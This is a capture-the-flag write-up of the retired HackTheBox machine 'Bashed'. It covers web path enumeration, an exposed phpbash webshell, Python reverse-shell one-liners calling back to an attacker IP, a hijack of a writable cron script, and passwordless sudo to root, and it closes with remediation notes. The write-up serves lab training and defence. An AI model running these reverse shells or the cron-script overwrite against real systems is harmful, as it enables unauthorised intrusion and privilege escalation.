HTB Bashed: phpbash webshell and a cron job to root

retired-machineeasy

Bashed is a retired HackTheBox easy Linux machine that teaches the classic web-to-root ladder in miniature. Synopsis: Apache on Ubuntu, a phpbash webshell in /dev, a writable cron script running as scriptmanager, and a passwordless sudo to root.

$ Enumeration — Nmap plus gobuster

# bash: scan and fuzz web paths
nmap -sC -sV -oN bashed.nmap 10.10.10.68
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Gobuster finds /dev/phpbash.min.php — a full PHP terminal webshell sitting in the open. Enumerate web paths: developers leave tools behind.

$ Foothold — upgrade the webshell

# bash: reverse shell plus stabilize
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.23",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
script /dev/null -c bash
# then: export TERM=xterm, stty raw -echo; fg

phpbash is interactive in the browser, but upgrade to a real www-data shell and stabilize it before enumerating users, cron jobs, and SUID binaries.

$ Privilege escalation — writable cron script

# bash: hijack the minute cron
cat /etc/crontab   # /scripts/test.py runs every minute as scriptmanager
ls -l /scripts/test.py   # writable!
echo 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.23",4445));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])' > /scripts/test.py

A cron job runs /scripts/test.py every minute as scriptmanager — and the file is writable. Overwrite it, wait for the tick, catch the callback as scriptmanager.

$ Root — passwordless sudo

# bash: sudo to root, read flags
sudo -l   # scriptmanager -> NOPASSWD path
sudo su -
cat ~/user.txt
cat /root/root.txt

sudo -l reveals the passwordless path to root. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Treating phpbash as enough (browser shells die — always upgrade first) and running LinPEAS before the manual pass (the cron job was visible in /etc/crontab in ten seconds).

$ Remediation notes

Remove dev webshells from production, never leave cron-executed scripts world-writable, and audit sudo -l output on every host. Written by Lucky Thandel.
